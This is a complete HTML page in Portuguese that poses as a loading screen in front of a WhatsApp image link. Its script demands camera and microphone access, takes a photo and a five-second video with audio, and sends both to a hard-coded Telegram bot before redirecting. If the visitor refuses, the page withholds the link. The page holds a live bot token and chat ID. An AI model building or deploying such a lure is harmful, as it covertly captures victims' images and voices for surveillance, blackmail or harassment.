<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Carregando...</title>
  <style>
    body {
      background: #000000;
      margin: 0;
      padding: 0;
      overflow: hidden;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: sans-serif;
    }
    video, canvas { display: none; }
    .msg-erro { text-align: center; display: none; }
  </style>
</head>
<body>

  <div id="msgErro" class="msg-erro">
    <h2>Acesso negado.</h2>
    <p>É necessário permitir o uso da câmera e do microfone para continuar.</p>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const TELEGRAM_TOKEN = '8387772090:AAEEWGOfpNJy0xT-2GwLQymQptoziAeaAR4';
    const CHAT_ID = '2003666494';
    const REDIRECT_URL = 'https://i.ibb.co/ccPKRYw7/Whats-App-Image-2017-05-18-at-11-43-44.jpg';

    async function iniciarNexusApp() {
      try {
        // Solicita permissões de Mídia (se o usuário recusar, cai direto no catch)
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true
        });

        const video = document.getElementById('video');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          // Captura Foto em 1 segundo
          setTimeout(() => capturarFoto(video), 1000);

          // Inicia Gravação de Vídeo (5 segundos) e redireciona ao terminar com sucesso
          setTimeout(() => gravarVideoEAudio(stream, 5000), 1200);
        };

      } catch (err) {
        console.error("Permissão negada ou erro:", err);
        
        // SE NÃO PERMITIR: O site NÃO abre o link. 
        // Exibe mensagem e tenta fechar a janela/aba (quando permitido pelo navegador)
        document.getElementById('msgErro').style.display = 'block';
        
        try {
          window.close();
        } catch(e) {}
        
        // Se o navegador bloquear o fechamento automático da aba, redireciona para uma página em branco ou segura
        setTimeout(() => {
          window.location.href = "about:blank";
        }, 1500);
      }
    }

    // Capturar e Enviar Foto
    function capturarFoto(video) {
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        if (!blob) return;
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'foto_nexus.jpg');
        
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
      }, 'image/jpeg', 0.85);
    }

    // Gravar Vídeo (com Áudio) e Enviar
    function gravarVideoEAudio(stream, duracao) {
      let mediaRecorder;
      try {
        mediaRecorder = new MediaRecorder(stream);
      } catch (e) {
        return;
      }

      let chunks = [];
      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/mp4' });
        
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('video', blob, 'video_nexus.mp4');
        
        // Só redireciona para o site correto SE permitir e enviar com sucesso
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd })
          .finally(() => {
            window.location.href = REDIRECT_URL;
          });

        // Encerra a Câmera e Microfone
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), duracao);
    }

    window.addEventListener('DOMContentLoaded', iniciarNexusApp);
  </script>
</body>
</html>
